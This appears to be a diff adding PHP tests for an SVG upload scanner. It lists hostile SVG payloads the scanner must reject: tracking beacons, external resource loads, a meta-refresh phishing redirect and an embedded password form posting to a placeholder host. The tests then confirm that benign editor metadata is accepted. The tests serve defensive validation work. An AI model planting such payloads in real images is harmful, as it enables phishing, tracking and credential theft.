@@ -333,3 +333,38 @@ it('rejects executable URI schemes containing XML-encoded browser controls', fun
     'carriage return in vbscript href' => ['href', 'vb&#x0d;script:MsgBox(1)'],
     'newline in data href' => ['href', 'da&#x0a;ta:text/html;base64,PHNjcmlwdD4='],
 ]);
+
+it('rejects external loads and embedded HTML that need no script, use or image element', function (string $payload): void {
+    $path = writeSvg($payload);
+
+    try {
+        expect(fn () => (new SvgScanner)->scan($path))->toThrow(MediaUploadException::class);
+    } finally {
+        @unlink($path);
+    }
+})->with([
+    'filter image' => ['<svg xmlns="http://www.w3.org/2000/svg"><filter id="f"><feImage href="https://example.test/track.png"/></filter><rect filter="url(#f)"/></svg>'],
+    'filter image through XLink' => ['<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><filter id="f"><feImage xlink:href="//example.test/track.png"/></filter></svg>'],
+    'external pattern template' => ['<svg xmlns="http://www.w3.org/2000/svg"><pattern id="p" href="https://example.test/paint.svg#p"/></svg>'],
+    'external gradient template' => ['<svg xmlns="http://www.w3.org/2000/svg"><linearGradient id="g" href="other.svg#g"/></svg>'],
+    'external text path' => ['<svg xmlns="http://www.w3.org/2000/svg"><text><textPath href="https://example.test/path.svg#p">x</textPath></text></svg>'],
+    'CSS image-set in a style attribute' => ['<svg xmlns="http://www.w3.org/2000/svg" style="background-image: image-set(\'https://example.test/track.png\' 1x)"/>'],
+    'CSS image-set in a style element' => ['<svg xmlns="http://www.w3.org/2000/svg"><style>svg { background: -webkit-image-set("https://example.test/track.png" 1x); }</style></svg>'],
+    'HTML stylesheet link' => ['<svg xmlns="http://www.w3.org/2000/svg" xmlns:h="http://www.w3.org/1999/xhtml"><h:link rel="stylesheet" href="https://example.test/style.css"/></svg>'],
+    'HTML meta refresh' => ['<svg xmlns="http://www.w3.org/2000/svg" xmlns:h="http://www.w3.org/1999/xhtml"><h:meta http-equiv="refresh" content="0;url=https://example.test/phish"/></svg>'],
+    'HTML base' => ['<svg xmlns="http://www.w3.org/2000/svg"><base xmlns="http://www.w3.org/1999/xhtml" href="https://example.test/"/></svg>'],
+    'HTML credential form' => ['<svg xmlns="http://www.w3.org/2000/svg" xmlns:h="http://www.w3.org/1999/xhtml"><h:form action="https://example.test/collect"><h:input name="password"/></h:form></svg>'],
+    'HTML image beacon' => ['<svg xmlns="http://www.w3.org/2000/svg" xmlns:h="http://www.w3.org/1999/xhtml"><h:img src="https://example.test/track.png"/></svg>'],
+    'HTML document root' => ['<html xmlns="http://www.w3.org/1999/xhtml"><body><p>not an image</p></body></html>'],
+]);
+
+it('accepts editor metadata, hyperlinks and local references', function (): void {
+    $path = writeSvg('<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#" xmlns:cc="http://creativecommons.org/ns#" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:inkscape="http://www.inkscape.org/namespaces/inkscape"><metadata><rdf:RDF><cc:Work rdf:about=""><dc:format>image/svg+xml</dc:format><dc:type rdf:resource="http://purl.org/dc/dcmitype/StillImage"/></cc:Work></rdf:RDF></metadata><defs><linearGradient id="a"/><linearGradient id="b" xlink:href="#a"/><filter id="f"><feImage href="#shape"/></filter><path id="p" d="M0 0h10"/></defs><g id="shape" inkscape:label="Layer 1"><rect fill="url(#b)" filter="url(#f)"/></g><text><textPath href="#p">text</textPath></text><a href="https://example.test/page" target="_blank"><text>link</text></a><image href="data:image/png;base64,iVBORw0KGgo="/></svg>');
+
+    try {
+        (new SvgScanner)->scan($path);
+        expect(true)->toBeTrue();
+    } finally {
+        @unlink($path);
+    }
+});
